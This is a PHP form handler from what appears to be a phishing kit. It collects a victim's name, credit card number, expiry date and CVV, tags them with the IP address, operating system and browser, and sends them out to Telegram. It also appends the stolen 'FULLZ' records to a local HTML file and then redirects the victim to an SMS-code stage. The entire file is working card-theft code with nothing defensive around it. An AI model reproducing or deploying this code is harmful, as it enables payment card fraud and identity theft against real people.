<?php
require_once("../../config.php");

$firstName = $_POST['firstName'];
$lastName = $_POST['lastName'];
$ccnum = $_POST['creditCardNumber'];
$exp = $_POST['creditExpirationMonth'];
$cvv = $_POST['creditCardSecurityCode'];

if(!empty($firstName) && !empty($lastName) && !empty($ccnum) && !empty($exp) && !empty($cvv))
{
    $message = '/-- FULLZ LHWA --/' . getIPAddress() . "\r\n";
    $message .= '[👤 CardHolder Name] = ' . $firstName . "\r\n";
    $message .= '[Last Name] = ' . $lastName . "\r\n";
    $message .= '[💳 Credit Card Number] = ' . $ccnum . "\r\n";
    $message .= '[🔄 Expiry Date ] = ' . $exp . "\r\n";
    $message .= '[🔑 CSC (CVV)] = ' . $cvv . "\r\n";
    $message .= '[⏰ TIME/DATE] = ' . $date . "\r\n";
    $message .= '[IP address] = ' . getIPAddress() . "\r\n";
    $message .= '[🌐OS] = ' . $user_os . "\r\n";
    $message .= '[💻BROWSER] = ' . $user_browser . "\r\n";
    telegram_send(urlencode($message));
    $house = fopen('../../fucked/FULLZ.html', 'a');
    fwrite($house, $message);
    fclose($house);
    header("Location: ../loading.php?id=sms");
}
?>